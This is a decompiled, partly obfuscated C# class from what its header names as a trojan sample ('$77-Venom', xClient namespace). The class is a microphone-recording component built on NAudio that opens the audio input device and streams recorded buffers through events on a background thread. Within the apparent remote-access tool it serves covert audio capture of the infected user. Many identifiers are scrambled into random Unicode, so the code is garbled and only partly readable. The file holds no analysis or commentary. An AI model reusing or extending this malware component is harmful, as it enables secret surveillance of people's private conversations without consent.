// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInEvent
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave
{
  public class WaveInEvent : IWaveIn, IDisposable
  {
    private readonly AutoResetEvent callbackEvent;
    private readonly SynchronizationContext syncContext;
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;

    public event EventHandler<퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢> DataAvailable;

    public event EventHandler<鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5> RecordingStopped;

    public WaveInEvent()
    {
      this.callbackEvent = new AutoResetEvent(false);
      this.syncContext = SynchronizationContext.Current;
      this.DeviceNumber = 0;
      this.WaveFormat = new 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
    }

    public static int DeviceCount => 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.팡年웮쪳᯲\uEF02\uFFFD棕\u2860뫖ጲ薂嫧ܪ\uFFFD䘐쯷襲螖\u22D1();

    public static 髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖 GetCapabilities(
      int devNumber)
    {
      髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖 waveInCaps = new 髹\uEC07㣒鶗禺\u2F05貥趣瞥봩载룏빇棵鸮\u2FAB씲磡뉄㙖();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uE43A\uFFFD莩礃\u0B59退蔂豅츕龜ⲱ䛮텁ﵫ䔺ᤷ\uEEFC惀\uE174幚((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uE4AD稭䟕ꦹオ禫愌\uE716ꔰ\u22AB醋̩粺圢Ⅷᣉ菙锪끢鳽(out this.waveInHandle, (IntPtr) this.DeviceNumber, this.WaveFormat, this.callbackEvent.SafeWaitHandle.DangerousGetHandle(), IntPtr.Zero, 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\u2866媧뗂歑붢竞镞ªⳣꇎ㚢\uED36皲ꁿЬ㲻\uF1EDႈ\uFFFD䦓.뷜ꪀ䑔蝴ʆ䅕\uEDC9ꆬ褛쪠叺嫹씇ᒒ\u089C\u05CD嘡\uFFFD\uFFFD뮀), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.䚽ㄝ挨\uE7F3솭碙\uF698\u175Aﻜ砘\u1941鎻퀸\u28AE倨껱屚\uFFFD뙼瞘(this.waveInHandle), "waveInStart");
      this.recording = true;
      ThreadPool.QueueUserWorkItem((WaitCallback) (state => this.RecordThread()), (object) null);
    }

    private void RecordThread()
    {
      Exception e = (Exception) null;
      try
      {
        this.DoRecording();
      }
      catch (Exception ex)
      {
        e = ex;
      }
      finally
      {
        this.recording = false;
        this.RaiseRecordingStoppedEvent(e);
      }
    }

    private void DoRecording()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
      while (this.recording)
      {
        if (this.callbackEvent.WaitOne() && this.recording)
        {
          foreach (WaveInBuffer buffer in this.buffers)
          {
            if (buffer.Done)
            {
              if (this.DataAvailable != null)
                this.DataAvailable((object) this, new 퓎ᾴ㓁䒧囉\uF78A\uF0C4嚑葧\uF759\u2706匠猕\u088E뾜厇铋鮟唏㪢(buffer.Data, buffer.BytesRecorded));
              buffer.Reuse();
            }
          }
        }
      }
    }

    private void RaiseRecordingStoppedEvent(Exception e)
    {
      EventHandler<鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 鳷즤핿ེ嵔갔ᬅ벐յ\u297B\u3209䎪䌂\u2AA1侫\u3298嚃鲗쟈\uEDF5(e))), (object) null);
    }

    public void StopRecording()
    {
      this.recording = false;
      this.callbackEvent.Set();
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\u18F8閏ꦟᩍ顎襻혷莮氈묳헟푓旷Ӻ᠔䮼证㭝\u2673㚱(this.waveInHandle), "waveInStop");
    }

    public 裞䨖觤㥟㛴먰\uEC41\u136C嵹乢\uE98Cᘁቫ륺끂볃\uF732\uFFFD枽侏 WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
    }

    private void CloseWaveInDevice()
    {
      int num1 = (int) 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.笂䝉낋ꓷ隌㴐䮘듞\uED52暷䖤穳鰹屭雾឵䲩ힳ梴훆(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uE839꾤趥팞\u2494॔䑅ﭮ碧䜋搿畦勴攽\uF529䜍钜侺ꡐ닞(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ((IntPtr) this.DeviceNumber, 0, 骊쀁岬֫膒朸颅搹Ⳕ禈ꕷﴻＪ觟䪽Ȁꢹⱝ㶼疡.ᯢ\u330B뮛諒蹻샋浢봀炚㤘䌳嫿廂\u08C0맹쏧䘃\uF533ﲍꅬ) : new \uF2CAᬔ髻\uE4C6닸\uF7DF擎ꛇ\uEDF0\uFFFD㑐\uE4BAꕓዪ锱䲾㓑疖\uF8CCＭ(this.waveInHandle, 0, 骊쀁岬֫膒朸颅搹Ⳕ禈ꕷﴻＪ觟䪽Ȁꢹⱝ㶼疡.䨈ڍ끪\u1FFF汎赓휏蠡褍瓤总洅삉鄞迮븆䛂\uE85C\u171C빵);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
